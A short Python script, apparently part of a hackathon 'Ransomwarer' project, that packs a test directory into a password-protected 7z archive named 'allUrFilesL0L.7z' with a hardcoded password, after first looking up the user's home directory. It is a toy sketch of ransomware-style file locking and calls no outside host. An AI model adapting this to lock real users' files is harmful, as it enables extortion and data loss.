import py7zr
import os

# Get home directory
home_path = os.path.expanduser('~')
print(home_path)
home_path = "/home/luke/Downloads/HackathonSpring2022/Ransomwarer/test/"

with py7zr.SevenZipFile('allUrFilesL0L.7z', 'w', password='HotzFellas') as archive:
    archive.writeall(home_path)
